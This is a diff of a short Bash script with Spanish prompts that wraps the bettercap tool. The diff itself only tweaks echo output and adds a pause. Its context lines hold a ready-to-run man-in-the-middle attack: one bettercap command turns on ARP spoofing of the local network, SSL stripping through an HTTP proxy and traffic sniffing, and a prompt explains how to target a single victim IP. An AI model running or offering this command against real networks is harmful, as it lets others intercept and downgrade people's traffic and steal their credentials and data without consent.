@@ -20,11 +20,13 @@ if [ -z "$1" ]; then
         echo 
         exit 0
 fi
-echo
+echo ".."
 echo
 echo "Teclea exit para iniciar sniff"
 echo
 echo "Para especificar solo una IP objetivo: set arp.spoof.tarjets IP"
+echo
+sleep 3
 #netdiscover -i $1
 bettercap -iface $1 -eval "net.probe on; ticker on "
 bettercap -iface $1 -eval "net.probe on; set http.proxy.sslstrip true; set arp.spoof.internal true; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on ; "
